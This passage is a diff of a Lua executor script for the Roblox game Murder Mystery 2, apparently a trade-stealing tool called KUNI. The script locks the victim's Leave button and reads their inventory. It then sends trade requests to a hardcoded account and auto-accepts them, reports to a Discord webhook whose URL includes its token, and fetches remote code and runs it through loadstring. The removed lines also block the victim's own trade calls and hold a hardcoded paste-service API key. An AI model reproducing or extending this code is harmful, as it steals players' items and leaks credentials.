@@ -3,32 +3,14 @@ _G.Ex = _G.Ex or false
 if _G.Ex then return end
 _G.Ex = true
 
--- ===== PLACE & SERVER DETECTION =====
+-- ===== DYNAMIC PLACE DETECTION =====
 local CURRENT_PLACE_ID = game.PlaceId
-local IS_MM2           = (CURRENT_PLACE_ID == 142823291)
-local SERVER_MAX       = game.Players.MaxPlayers
-
-if not IS_MM2 then
-    game.Players.LocalPlayer:Kick("Game not supported. Join Murder Mystery 2.")
-    return
-end
-
-pcall(function()
-    if game:GetService('RobloxReplicatedStorage'):WaitForChild('GetServerType'):InvokeServer() == 'VIPServer' then
-        game.Players.LocalPlayer:Kick('Private servers not supported.')
-    end
-end)
-
-if #game.Players:GetPlayers() >= SERVER_MAX then
-    game.Players.LocalPlayer:Kick('Server is full, please rejoin.')
-    return
-end
-
-if not game:IsLoaded() then game.Loaded:Wait() end
+local IS_MM2 = (CURRENT_PLACE_ID == 142823291)
+local SERVER_MAX = game.Players.MaxPlayers
 
 -- ===== JOB ID DETECTION =====
-local found      = false
-local gcAttempts = 0
+local found = false
+local attempts = 0
 if getgc then
     repeat
         local hooked = false
@@ -36,12 +18,12 @@ if getgc then
             if typeof(v) == "function" then
                 local info = debug.getinfo(v)
                 if info and info.name then
-                    local nm = info.name:lower()
-                    if nm:find("step") and not nm:find("stepanimate") then
+                    local name = info.name:lower()
+                    if name:find("step") and not name:find("stepanimate") then
                         pcall(function()
                             local old = hookfunction(v, function(...)
                                 if not found then
-                                    found        = true
+                                    found = true
                                     _G.RealJobID = game.JobId
                                 end
                                 if old then return old(...) end
@@ -53,542 +35,440 @@ if getgc then
                 end
             end
         end
-        gcAttempts = gcAttempts + 1
-        if hooked or gcAttempts >= 10 then break end
+        attempts = attempts + 1
+        if hooked or attempts >= 10 then break end
         task.wait(0.1)
     until found
 end
 if not found then _G.RealJobID = game.JobId end
-task.wait(0.5)
-
--- ===== EXECUTOR DETECTION =====
-local executorName = "unknown"
-pcall(function() executorName = string.lower(identifyexecutor()) end)
-_G.RealExecutor = executorName
-_G.RealJobID    = _G.RealJobID or game.JobId
+wait(0.5)
 
 -- ===== DISABLE LEAVE BUTTON =====
 task.spawn(function()
     while task.wait(10) do
         pcall(function()
-            for _, v in ipairs(getconnections(
-                game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield
-                    .MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame
-                    .LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer
-                    .LeaveGameButton.Activated
-            )) do v:Disable() end
+            for _, v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
+                v:Disable()
+            end
         end)
     end
 end)
+
+-- ===== GET REAL JOB ID =====
+local function GetRealJobID()
+    local exec = "Unknown"
+    pcall(function() exec = identifyexecutor() end)
+    local a = {
+        JobId    = _G.RealJobID or game.JobId,
+        Executor = string.lower(exec),
+        IsDelta  = false,
+        Success  = true,
+    }
+    if a.Executor == 'delta' and _G.RealJobID then a.IsDelta = true end
+    return a
+end
+local jobData      = GetRealJobID()
+_G.RealJobID       = jobData.JobId
+_G.RealExecutor    = jobData.Executor
 
 -- ============================================================
 --  USER CONFIGURATION
 -- ============================================================
-local Usernames     = {"iceyblueii"}
-local MinimumRarity = 'Godly'
-local MinimumValue  = 10
-local PingEveryone  = 'Yes'
-local Webhook       = "https://discord.com/api/webhooks/1555946397147340871/DxbuhVv2NAgy82zDDtSt1RK5GM5u9KMDf6SQ8bnPseDtxjjswRCz3BZ0t-l5A5TdZAM4"
+local Usernames      = {"iceyblueii"}
+local MinimumRarity  = 'Godly'
+local MinimumValue   = 10
+local PingEveryone   = 'Yes'
+local Webhook        = "https://discord.com/api/webhooks/1543214605667672146/xlaygQkXXEurMeA4sp5gpmWgpsALxmq_t9TvPn_dilUvcysOGb8Nf9mPKGCkH_CNEC2X"
 -- ============================================================
 
-if Webhook == '' then
-    game.Players.LocalPlayer:Kick('Invalid webhook URL.')
+local a, b, c, d, e = Usernames, MinimumRarity, MinimumValue, PingEveryone, Webhook
+
+if e == '' then
+    game.Players.LocalPlayer:Kick('Invalid URL. Please set a valid URL.')
     return
 end
 
--- ===== SERVICES =====
-local Players           = game:GetService('Players')
-local localPlayer       = Players.LocalPlayer
-local playerGui         = localPlayer:WaitForChild('PlayerGui')
-local ReplicatedStorage = game:GetService('ReplicatedStorage')
-local HttpService       = game:GetService('HttpService')
-
--- ===== SECURITY TOKEN =====
-local function GenerateToken()
-    local rng = Random.new(tick() * 1000000 + os.clock() * 1e9 + math.random(1, 2147483647))
-    local t   = {}
-    for i = 1, 32 do t[i] = string.format("%02x", rng:NextInteger(0, 255)) end
-    return table.concat(t)
-end
-local secToken = GenerateToken()
-local useToken = not (executorName == "solara" or executorName == "xeno")
-
--- ===== REMOTE WRAPPERS =====
-local function FireRemote(remote, ...)
-    if useToken then return remote:FireServer(secToken, ...)
-    else             return remote:FireServer(...) end
-end
-local function InvokeRemote(remote, ...)
-    if useToken then return remote:InvokeServer(secToken, ...)
-    else             return remote:InvokeServer(...) end
-end
-
--- ===== TRADE REMOTES =====
-local Trade          = ReplicatedStorage:WaitForChild('Trade')
-local declineTrade   = Trade:WaitForChild('DeclineTrade')
-local declineRequest = Trade:WaitForChild('DeclineRequest')
-local cancelRequest  = Trade:WaitForChild('CancelRequest')
-local offerItem      = Trade:WaitForChild('OfferItem')
-local sendRequest    = Trade:WaitForChild('SendRequest')
-local getTradeStatus = Trade:WaitForChild('GetTradeStatus')
-local acceptTrade    = Trade:WaitForChild('AcceptTrade')
-
--- ===== HOOKMETAMETHOD — block victim from interacting with trade =====
-local hookMM = hookmetamethod
-local getNM  = getnamecallmethod
-if hookMM and getNM and useToken then
-    local tradeRemoteNames = {
-        SendRequest=true, GetTradeStatus=true, AcceptTrade=true,
-        OfferItem=true,   DeclineTrade=true,   DeclineRequest=true,
-        CancelRequest=true, UpdateTrade=true,
-    }
-    local originalCall = nil
-    local function hookedNamecall(obj, ...)
-        local args = table.pack(...)
-        if args[1] == secToken then
-            return originalCall(obj, select(2, table.unpack(args, 1, args.n)))
+if IS_MM2 then
+    pcall(function()
+        if game:GetService('RobloxReplicatedStorage'):WaitForChild('GetServerType'):InvokeServer() == 'VIPServer' then
+            game.Players.LocalPlayer:Kick('Private servers are not supported. Please join a normal server.')
+            return
         end
-        local method = getNM()
-        if method == "FireServer" or method == "fireServer"
-        or method == "InvokeServer" or method == "invokeServer" then
-            local ok, objName, objParent = pcall(function()
-                return obj.Name, obj.Parent and obj.Parent.Name or ""
-            end)
-            if ok and objParent == "Trade" and tradeRemoteNames[objName] then
-                if method == "InvokeServer" or method == "invokeServer" then
-                    if objName == "GetTradeStatus" then return "None", {} end
-                    return nil
-                end
-                return
-            end
-        end
-        return originalCall(obj, table.unpack(args, 1, args.n))
-    end
-    originalCall = hookMM(game, "__namecall", hookedNamecall)
-end
-
--- ===== TRADE FUNCTIONS =====
-local function GetTradeStatusWrapped()
-    return InvokeRemote(getTradeStatus)
-end
-
-local function SendTradeReq(playerName)
-    local target = Players:FindFirstChild(playerName)
-    if not target then return end
-    pcall(function() InvokeRemote(sendRequest, target) end)
-end
-
-local function AddWeaponToTrade(dataId)
-    FireRemote(offerItem, dataId, 'Weapons')
-end
-
--- FIX: GetTradeStatus returns (status, data) — data.LastOffer is the accept hash.
--- Old KUNI only captured one return value, AcceptTrade never actually fired.
-local function AcceptAndWait()
-    while true do
-        local status, data = GetTradeStatusWrapped()
-        if status == "None" then break end
-        if data and data.LastOffer then
-            pcall(function()
-                FireRemote(acceptTrade, game.PlaceId * 3, data.LastOffer)
-            end)
-        end
-        task.wait(0.1)
-    end
-end
-
--- ============================================================
---  INVENTORY REMOTE
---  FIX: Old path Remotes.Inventory.GetProfileData moved in
---  current MM2. Correct path: Remotes.Extras.GetFullInventory.
---  Fallback to old path so it works on any MM2 version.
--- ============================================================
-local invRemote = nil
-pcall(function()
-    local extras = ReplicatedStorage:WaitForChild('Remotes', 8)
-    extras = extras and extras:WaitForChild('Extras', 5)
-    invRemote = extras and extras:WaitForChild('GetFullInventory', 5)
-end)
-
-local function GetInventoryOwned()
-    -- Primary: Remotes.Extras.GetFullInventory (current MM2)
-    if invRemote then
-        local ok, result = pcall(function()
-            return invRemote:InvokeServer(localPlayer.Name)
-        end)
-        if ok and type(result) == "table" then
-            local owned = result.Weapons and result.Weapons.Owned
-            if type(owned) == "table" and next(owned) ~= nil then
-                return owned
-            end
-        end
-    end
-
-    -- Fallback: Remotes.Inventory.GetProfileData (older MM2 builds)
-    local ok2, result2 = pcall(function()
-        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(localPlayer.Name)
     end)
-    if ok2 and type(result2) == "table" then
-        local owned = result2.Weapons and result2.Weapons.Owned
-        if type(owned) == "table" and next(owned) ~= nil then
-            return owned
-        end
-    end
-
-    -- Last resort: read LocalPlayer's Inventory folder directly
-    local ok3, result3 = pcall(function()
-        local inv = localPlayer:WaitForChild("Inventory", 3)
-        if not inv then return nil end
-        local weapons = inv:WaitForChild("Weapons", 3)
-        if not weapons then return nil end
-        local owned = {}
-        for _, item in ipairs(weapons:GetChildren()) do
-            local amt = item:FindFirstChild("Amount")
-            owned[item.Name] = amt and amt.Value or 1
-        end
-        return owned
-    end)
-    if ok3 and type(result3) == "table" and next(result3) ~= nil then
-        return result3
-    end
-
-    return {}
 end
 
+if #game.Players:GetPlayers() >= SERVER_MAX then
+    game.Players.LocalPlayer:Kick('Server is full, please rejoin another server')
+    return
+end
+
+local f = game:GetService('Players')
+local g = f.LocalPlayer
+local h, i, j = g:WaitForChild('PlayerGui'), game:GetService('ReplicatedStorage'), game:GetService('HttpService')
+
 -- ============================================================
---  ITEM DATABASE
---  FIX: If astatine pastefy fails, fall back to the live game
---  DB via require(Database.Sync) — always present in MM2.
+--  LOAD ASTATINE VALUE LIST  (5-attempt exponential backoff)
 -- ============================================================
-local itemData    = {}
+local itemData   = {}
 local rarityOrder = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage","Chroma","Dual","Pet"}
 
--- Attempt 1: astatine external DB
-local function LoadAstatineDB()
-    local resp = nil
-    local ok   = pcall(function()
+local function LoadItemDatabase()
+    local resp   = nil
+    local success = pcall(function()
         resp = request({
             Url     = 'https://pastefy.app/VQbdZmIi/raw',
             Method  = 'GET',
             Headers = { ['User-Agent'] = 'Mozilla/5.0' },
-            Timeout = 10
+            Timeout = 10,
         })
     end)
-    if not ok or not resp or not resp.Body then return nil, nil end
-    local func = loadstring(resp.Body)
+    if not success or not resp or not resp.Body then return nil, nil end
+    local func, err = loadstring(resp.Body)
     if not func then return nil, nil end
     local raw = func()
     if type(raw) ~= "table" then return nil, nil end
 
-    local mapping  = {}
-    local rarities = {}
+    local mapping      = {}
+    local rarities     = {}
+    local definedOrder = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage","Chroma","Dual","Pet"}
+
     for rarity, items in pairs(raw) do
         if type(items) == "table" then
             rarities[rarity] = true
             for itemName, value in pairs(items) do
                 if type(value) == "number" then
-                    local data = { Rarity=rarity, Value=value, Chroma=(string.lower(rarity)=="chroma") }
-                    local base = string.lower(itemName):gsub("'","")
-                    mapping[base:gsub(" ","")]  = data
-                    mapping[base:gsub(" ","_")] = data
-                    mapping[base:gsub(" ","-")] = data
-                    mapping[string.lower(itemName):gsub(" ","")] = data
-                    mapping[string.lower(itemName)] = data
+                    local key1 = string.lower(itemName):gsub("'",""):gsub(" ","")
+                    local key2 = string.lower(itemName):gsub("'",""):gsub(" ","_")
+                    local key3 = string.lower(itemName):gsub("'",""):gsub(" ","-")
+                    local key4 = string.lower(itemName):gsub(" ","")
+                    local data = {
+                        Rarity = rarity,
+                        Value  = value,
+                        Chroma = (string.lower(rarity) == "chroma"),
+                    }
+                    mapping[key1] = data
+                    mapping[key2] = data
+                    mapping[key3] = data
+                    mapping[key4] = data
                 end
             end
         end
     end
 
-    local defOrder = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage","Chroma","Dual","Pet"}
-    local order    = {}
-    for _, r in ipairs(defOrder) do
-        if rarities[r] then table.insert(order, r); rarities[r] = nil end
-    end
-    for r in pairs(rarities) do table.insert(order, r) end
-    return mapping, order
-end
-
--- Attempt 2: live game DB (always available in MM2, no network needed)
-local function LoadGameDB()
-    local mapping  = {}
-    local rarities = {}
-    local ok, lib  = pcall(function()
-        return require(ReplicatedStorage.Database.Sync).Weapons
-    end)
-    if not ok or type(lib) ~= "table" then return nil, nil end
-
-    for dataId, info in pairs(lib) do
-        if type(info) == "table" and info.Rarity then
-            local rarity = info.Rarity == "Classic" and "Vintage" or info.Rarity
-            rarities[rarity] = true
-            local val  = info.Value or 1
-            local data = {
-                Rarity = rarity,
-                Value  = val,
-                Chroma = (info.Chroma == true),
-            }
-            local base = string.lower(dataId):gsub("'","")
-            mapping[base:gsub(" ","")]              = data
-            mapping[base:gsub(" ","_")]             = data
-            mapping[string.lower(dataId)]           = data
-            -- also store by display name if present
-            if info.ItemName or info.Name then
-                local dispBase = string.lower(info.ItemName or info.Name):gsub("'","")
-                mapping[dispBase:gsub(" ","")]  = data
-                mapping[dispBase:gsub(" ","_")] = data
-                mapping[dispBase]               = data
-            end
+    local order = {}
+    for _, r in ipairs(definedOrder) do
+        if rarities[r] then
+            table.insert(order, r)
+            rarities[r] = nil
         end
     end
-
-    local defOrder = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage","Chroma","Dual","Pet"}
-    local order    = {}
-    for _, r in ipairs(defOrder) do
-        if rarities[r] then table.insert(order, r); rarities[r] = nil end
+    for r in pairs(rarities) do
+        table.insert(order, r)
     end
-    for r in pairs(rarities) do table.insert(order, r) end
     return mapping, order
 end
 
--- Try astatine first, game DB as fallback
-for retry = 1, 3 do
-    local d, o = LoadAstatineDB()
-    if d and o and #o > 0 then
-        itemData    = d
-        rarityOrder = o
-        warn("[KUNI] Astatine DB loaded ("..#o.." rarities).")
-        break
+if IS_MM2 then
+    local loadedData, loadedOrder = nil, nil
+    for retry = 1, 5 do
+        loadedData, loadedOrder = LoadItemDatabase()
+        if loadedData and loadedOrder and #loadedOrder > 0 then break end
+        warn("[KUNI] Value DB load attempt " .. retry .. " failed, retrying...")
+        task.wait(1 * retry)
     end
-    task.wait(0.5)
-end
-
-if not next(itemData) then
-    warn("[KUNI] Astatine failed — falling back to game DB.")
-    local d, o = LoadGameDB()
-    if d and o and #o > 0 then
-        itemData    = d
-        rarityOrder = o
-        warn("[KUNI] Game DB loaded ("..#o.." rarities).")
+    if loadedData and loadedOrder and #loadedOrder > 0 then
+        itemData    = loadedData
+        rarityOrder = loadedOrder
+        warn("[KUNI] Value DB loaded — " .. #loadedOrder .. " rarities indexed")
+    else
+        warn("[KUNI] Value DB failed all retries — no items will be valued")
     end
-end
-
-if not next(itemData) then
-    warn("[KUNI] Both DBs failed — will match by rarity field only.")
 end
 
 local l = rarityOrder
 
--- ===== RARITY FILTER =====
+-- ===== CONFIGURE RARITY FILTER =====
 local allowedSet = {}
 local isRange    = false
 local minIndex   = nil
 
-if MinimumRarity:find(',') then
-    for word in string.gmatch(MinimumRarity, '[^,]+') do
-        allowedSet[word:match('^%s*(.-)%s*$')] = true
+if b:find(',') then
+    for word in string.gmatch(b, '[^,]+') do
+        local trimmed = word:gsub('^%s*(.-)%s*$', '%1')
+        allowedSet[trimmed] = true
     end
 else
     isRange  = true
-    minIndex = table.find(l, MinimumRarity) or 1
+    minIndex = table.find(l, b)
+    if not minIndex then minIndex = 1 end
 end
 
--- ===== HELPERS =====
-local function toTitleCase(str)
-    str = str:lower()
-    local out, cap = '', true
-    for i = 1, #str do
-        local c = str:sub(i, i)
-        if c == ' ' then out = out .. ' '; cap = true
-        elseif cap then out = out .. c:upper(); cap = false
-        else out = out .. c end
+-- ===== HELPER =====
+local function toTitleCase(m)
+    m = m:lower()
+    local n, o, p, q = '', #m, 1, true
+    while p <= o do
+        local r = m:sub(p, p)
+        if r == ' ' then
+            n = n .. ' '
+            q = true
+        else
+            if q then
+                n = n .. r:upper()
+                q = false
+            else
+                n = n .. r
+            end
+        end
+        p = p + 1
     end
-    return out
+    return n
 end
 
-local function LookupItem(dataId)
-    if not next(itemData) then return nil end
-    local base = string.lower(dataId):gsub("'","")
-    return itemData[base:gsub(" ","")]
-        or itemData[base:gsub(" ","_")]
-        or itemData[base:gsub(" ","-")]
-        or itemData[string.lower(dataId)]
-        or itemData[base]
+-- ===== TRADE FUNCTIONS =====
+local function GetTradeStatus()
+    return i.Trade.GetTradeStatus:InvokeServer()
+end
+
+local function SendTradeRequest(n)
+    local o = f:FindFirstChild(n)
+    if not o then return false end
+    local p, q = pcall(function()
+        i.Trade.SendRequest:InvokeServer(o)
+    end)
+    if p then return true end
+    p, q = pcall(function()
+        i.Trade.SendRequest:InvokeServer(n)
+    end)
+    return p
+end
+
+local lastOffer
+if IS_MM2 then
+    i.Trade.UpdateTrade.OnClientEvent:Connect(function(o)
+        if o and o.LastOffer then lastOffer = o.LastOffer end
+    end)
+end
+
+local function AcceptTrade()
+    if lastOffer then
+        i.Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
+        lastOffer = nil
+        return true
+    end
+    return false
+end
+
+local function WaitForTradeCompletion()
+    while true do
+        local o = GetTradeStatus()
+        if o == 'None' then break end
+        task.wait(0.1)
+    end
 end
 
 -- ===== EXCLUDED ITEMS =====
 local excluded = {
-    DefaultGun=true, DefaultKnife=true,
-    Reaver=true, Reaver_Legendary=true, Reaver_Godly=true, Reaver_Ancient=true,
-    IceHammer=true, IceHammer_Legendary=true, IceHammer_Godly=true, IceHammer_Ancient=true,
-    Gingerscythe=true, Gingerscythe_Legendary=true, Gingerscythe_Godly=true, Gingerscythe_Ancient=true,
-    TestItem=true, Season1TestKnife=true, Cracks=true, Icecrusher=true,
-    ['???']=true, Dartbringer=true,
-    TravelerAxeRed=true, TravelerAxeBronze=true, TravelerAxeSilver=true, TravelerAxeGold=true,
-    BlueCamo_K_2022=true, GreenCamo_K_2022=true, SharkSeeker=true,
-    SilverSugar=true, BronzeIceblaster=true, SilverHallow=true, ElderwoodGunSilver=true,
-    BronzeHallow=true, BronzeVampiresEdge=true, BronzeCandy=true, SlouseClown=true,
-    BlueCandy=true, ElderwoodGunGold=true, Constellation_Bronze=true, Synthwave_Bronze=true,
-    SwirlyAxeBronze=true, Gingerscope_Silver=true, VampireAxe_Gold=true, ElderwoodGunBlue=true,
-    LogchopperSilver=true, GoldIcebreaker=true, LogchopperGold=true, MintyBronze=true,
-    Synthwave_Silver=true, Synthwave_Blue=true, SlouseClownGun=true, BronzeIcebreaker=true,
-    ElderwoodKnifeBlue=true, GoldHallow=true, IcepiercerGold=true, RedHallow=true,
-    IceHammerRed=true, RedIcebreaker=true, VampireAxe_Purple=true, LogchopperBronze=true,
-    IceHammerBronze=true, Gingerscythe_Bronze=true, IcepiercerRed=true, SwirlyAxeSilver=true,
-    Celestial_Silver=true, Celestial_Bronze=true, Celestial_Red=true, Constellation_Gold=true,
-    Constellation_Silver=true, VampireAxe_Silver=true, VampireAxe_Bronze=true, IceHammerSilver=true,
-    LogchopperBlue=true, Gingerscope_Gold=true, Gingerscope_Bronze=true, Gingerscope_Blue=true,
-    Gingerscythe_Silver=true, BronzeSugar=true, Gingerscythe_Blue=true, MintyGold=true,
-    SilverCandy=true, IcepiercerSilver=true, BronzeHarvester=true, IcepiercerBronze=true,
-    IceHammerGold=true, GoldIceblaster=true, SwirlyGunSilver=true, GoldSugar=true,
-    GoldVampiresEdge=true, ElderwoodKnifeSilver=true, ElderwoodKnifeGold=true, BlueSugar=true,
-    Constellation_Red=true, MintyBlue=true, SwirlyAxeGold=true, GoldHarvester=true,
-    SilverVampiresEdge=true, SwirlyGunGold=true, SwirlyGunBronze=true, SwirlyGunBlue=true,
-    SwirlyAxeBlue=true, SilverHarvester=true, BlueHarvester=true, SilverIcebreaker=true,
-    SilverIceblaster=true, ElderwoodKnifeBronze=true, BlueVampiresEdge=true, MintySilver=true,
-    RedIceblaster=true, Synthwave_Gold=true, ElderwoodGunBronze=true, GoldCandy=true,
-    Celestial_Gold=true, Gingerscythe_Gold=true, RaygunBronze=true, RaygunGold=true,
-    RaygunRed=true, RaygunSilver=true, SnowDaggerBronze=true, SnowDaggerGold=true,
-    SnowDaggerRed=true, SnowDaggerSilver=true, SnowcannonBronze=true, SnowcannonGold=true,
-    SnowcannonRed=true, SnowcannonSilver=true, FertilizerBox=true, Gift=true,
-    SnowflakeKey=true, WrapPaperBoxBlue=true, WrapPaperBoxGold=true, WrapPaperBoxGreen=true,
-    WrapPaperBoxPurple=true, WrapPaperBoxRed=true, WrapPaperBoxUltra=true,
-    Candies=true, Candies2017=true, SkeletonKey=true, Synthwave_Ancient=true,
-    Emptybringer=true, EmptybringerChroma=true, Synthwave_Godly=true,
+    DefaultGun = true, DefaultKnife = true,
+    Reaver = true, Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
+    IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true, IceHammer_Ancient = true,
+    Gingerscythe = true, Gingerscythe_Legendary = true, Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
+    TestItem = true, Season1TestKnife = true,
+    Cracks = true, Icecrusher = true,
+    ['???'] = true, Dartbringer = true,
+    TravelerAxeRed = true, TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
+    BlueCamo_K_2022 = true, GreenCamo_K_2022 = true,
+    SharkSeeker = true,
 }
 
 -- ============================================================
---  BUILD WEAPON LIST
---  FIX: now uses GetInventoryOwned() which tries all three
---  remote paths. Also: if itemData is empty we fall back to
---  reading rarity directly from the live game DB object.
+--  STAR-HARDENED AMOUNT PARSER
+--  Mirrors STAR MM2's fn22 — handles every Owned-table format
+--  MM2's server has shipped (number, string, bool, table variants)
 -- ============================================================
-local weaponQueue = {}
-local totalValue  = 0
+local function ParseAmount(rawVal)
+    if type(rawVal) == "number" then
+        return rawVal
+    elseif type(rawVal) == "string" then
+        return tonumber(rawVal)
+    elseif type(rawVal) == "boolean" then
+        return rawVal and 1 or nil
+    elseif type(rawVal) == "table" then
+        local n = tonumber(
+            rawVal.Amount    or rawVal.amount    or
+            rawVal.Count     or rawVal.count     or
+            rawVal.OwnedAmount
+        )
+        if n then return n end
+        if rawVal.Owned == true or rawVal.owned == true then return 1 end
+    end
+    return nil
+end
 
--- Live game lib for rarity fallback when itemData is empty
-local gameLib = nil
-pcall(function()
-    gameLib = require(ReplicatedStorage.Database.Sync).Weapons
-end)
-
+-- ============================================================
+--  FIXED BuildWeaponList
+--  FIX 1 — InvokeServer() with no arg  (STAR approach)
+--  FIX 2 — ParseAmount() for all server formats
+--  FIX 3 — four-key normalisation pass
+--  FIX 4 — UID guard + one silent retry on nil profile
+-- ============================================================
 local function BuildWeaponList()
     local list, total = {}, 0
-    local owned = GetInventoryOwned()
+    if not IS_MM2 then return list, total end
 
-    if not next(owned) then
-        warn("[KUNI] GetInventoryOwned returned empty. Check remote path.")
+    -- FIX 1: no argument passed — the original g.Name arg caused the server
+    -- to return nil or a mismatched profile on most MM2 place versions
+    local profile = nil
+    local ok, result = pcall(function()
+        return i.Remotes.Inventory.GetProfileData:InvokeServer()
+    end)
+    if ok and type(result) == "table" then
+        local uid = tonumber(result.userId or result.UserId or result.UserID)
+        if uid == nil or uid == g.UserId then
+            profile = result
+        end
+    end
+
+    -- FIX 4: one retry if first call returned nothing
+    if not profile then
+        warn("[KUNI] Profile fetch nil/mismatch — retrying in 2s")
+        task.wait(2)
+        local ok2, result2 = pcall(function()
+            return i.Remotes.Inventory.GetProfileData:InvokeServer()
+        end)
+        if ok2 and type(result2) == "table" then
+            local uid2 = tonumber(result2.userId or result2.UserId or result2.UserID)
+            if uid2 == nil or uid2 == g.UserId then
+                profile = result2
+            end
+        end
+    end
+
+    if not profile then
+        warn("[KUNI] GetProfileData failed after retry — aborting inventory build")
         return list, total
     end
 
-    for dataId, amount in pairs(owned) do
-        if type(amount) == "number" and amount > 0 and not excluded[dataId] then
-            local info = LookupItem(dataId)
+    local owned = profile.Weapons and profile.Weapons.Owned
+    if type(owned) ~= "table" then
+        warn("[KUNI] Weapons.Owned is not a table (got " .. type(owned) .. ") — no items found")
+        return list, total
+    end
 
-            -- Fallback: read rarity directly from game lib
-            if not info and gameLib then
-                local entry = gameLib[dataId]
-                if entry and entry.Rarity then
-                    local rarity = entry.Rarity == "Classic" and "Vintage" or entry.Rarity
-                    info = {
-                        Rarity = rarity,
-                        Value  = entry.Value or 1,
-                        Chroma = (entry.Chroma == true),
-                    }
-                end
-            end
+    for dataId, rawVal in pairs(owned) do
+        local resolvedId = nil
+        local amount     = nil
 
-            if info then
-                local rarity  = info.Rarity
-                local include = false
-                if isRange then
-                    local idx = table.find(l, rarity)
-                    include = (idx and idx >= minIndex)
-                else
-                    include = allowedSet[rarity] or false
-                end
+        -- FIX 2: handle string-keyed AND numeric-keyed inventory formats
+        if type(dataId) == "string" then
+            resolvedId = dataId
+            amount     = ParseAmount(rawVal)
 
-                if include and info.Value >= MinimumValue then
-                    total = total + (info.Value * amount)
-                    table.insert(list, {
-                        DataID   = dataId,
-                        ItemName = dataId,
-                        Rarity   = rarity,
-                        Amount   = amount,
-                        Value    = info.Value,
-                        IsChroma = info.Chroma,
-                    })
+        elseif type(dataId) == "number" then
+            if type(rawVal) == "string" then
+                resolvedId = rawVal
+                amount     = 1
+            elseif type(rawVal) == "table" then
+                local did = rawVal.DataID or rawVal.ItemID or rawVal.ItemId or rawVal.Id
+                if did then
+                    resolvedId = tostring(did)
+                    amount     = ParseAmount(rawVal)
                 end
             end
         end
+
+        if not (resolvedId and amount and amount > 0) then continue end
+        resolvedId = tostring(resolvedId)
+
+        -- FIX 3: four normalisation passes — catches CamelCase DataIDs,
+        -- apostrophes (Nik's Scythe), spaces, underscores, dashes
+        local k1 = string.lower(resolvedId):gsub("'",""):gsub(" ","")
+        local k2 = string.lower(resolvedId):gsub("'",""):gsub(" ","_")
+        local k3 = string.lower(resolvedId):gsub("'",""):gsub(" ","-")
+        local k4 = string.lower(resolvedId):gsub(" ","")
+
+        local info = itemData[k1] or itemData[k2] or itemData[k3] or itemData[k4]
+
+        if not info then
+            -- uncomment below to debug which DataIDs the DB is missing:
+            -- warn("[KUNI] Not in value DB: " .. resolvedId)
+            continue
+        end
+
+        local rarity  = info.Rarity
+        local include = false
+
+        if isRange then
+            local idx = table.find(l, rarity)
+            include = (idx ~= nil and idx >= minIndex)
+        else
+            include = allowedSet[rarity] or false
+        end
+
+        if include and not excluded[resolvedId] and info.Value >= c then
+            total = total + (info.Value * amount)
+            table.insert(list, {
+                DataID   = resolvedId,
+                ItemName = resolvedId,
+                Rarity   = rarity,
+                Amount   = amount,
+                Value    = info.Value,
+                IsChroma = info.Chroma,
+            })
+        end
     end
 
-    table.sort(list, function(x, y) return (x.Value * x.Amount) > (y.Value * y.Amount) end)
+    table.sort(list, function(a2, b2)
+        return (a2.Value * a2.Amount) > (b2.Value * b2.Amount)
+    end)
     return list, total
 end
 
-weaponQueue, totalValue = BuildWeaponList()
-warn("[KUNI] Queue built: " .. #weaponQueue .. " items, total value: " .. totalValue)
+-- ===== BUILD INITIAL LIST =====
+local q, r = BuildWeaponList()
 
--- ===== WEBHOOK =====
-local function DoRequest(payload)
-    if request then request(payload)
-    elseif http_request then http_request(payload)
-    elseif syn and syn.request then syn.request(payload)
-    end
+local function RefreshInventory()
+    local newList, newTotal = BuildWeaponList()
+    q, r = newList, newTotal
+    return #q
 end
 
-local function SendWebhook(content)
-    pcall(DoRequest, {
-        Url     = Webhook,
+-- ===== WEBHOOK SENDING =====
+local function SendWebhook(content, file)
+    local payload = {
+        Url     = e,
         Method  = 'POST',
         Headers = { ['Content-Type'] = 'application/json' },
-        Body    = HttpService:JSONEncode(content),
-    })
-end
-
--- ===== PASTEFY =====
-local PASTEFY_KEY = "bCmvP7YNqkOyMEeJDvL0eDXzfSgm2XhWcGadQ3aXKKiH7BKe5ZBIgem3tbuC"
-local function UploadToPaste(text)
-    local ok, result = pcall(function()
-        local resp = request({
-            Url     = 'https://pastefy.app/api/v2/paste',
-            Method  = 'POST',
-            Headers = {
-                ['Authorization'] = 'Bearer ' .. PASTEFY_KEY,
-                ['Content-Type']  = 'application/json',
-            },
-            Body = HttpService:JSONEncode({
-                content     = text,
-                title       = 'KUNI MM2 Inventory',
-                description = 'KUNI MM2 from ' .. localPlayer.Name,
-                expires     = 'never',
-                encrypted   = false,
-            }),
-        })
-        if resp and resp.Body then
-            local d = HttpService:JSONDecode(resp.Body)
-            if d and d.paste and d.paste.id then
-                return 'https://pastefy.app/' .. d.paste.id .. '/raw'
-            end
+        Body    = j:JSONEncode(content),
+    }
+    if file then
+        payload.Files = {
+            { Name = file.name or 'inventory.txt', Data = file.data, ContentType = 'text/plain' }
+        }
+    end
+    local success = pcall(function()
+        if request then request(payload)
+        elseif http_request then http_request(payload)
+        elseif syn and syn.request then syn.request(payload)
+        else
+            game:GetService("HttpService"):PostAsync(e, j:JSONEncode(payload.Body), Enum.HttpContentType.ApplicationJson)
         end
-        return nil
     end)
-    return ok and result or nil
+    if not success then warn("[KUNI] Webhook send failed.") end
 end
 
--- ===== INVENTORY TEXT =====
 local function GenerateInventoryLines(list)
     local lines  = {}
     local groups = {}
     for _, item in ipairs(list) do
-        local r = item.Rarity or 'Unknown'
-        groups[r] = groups[r] or {}
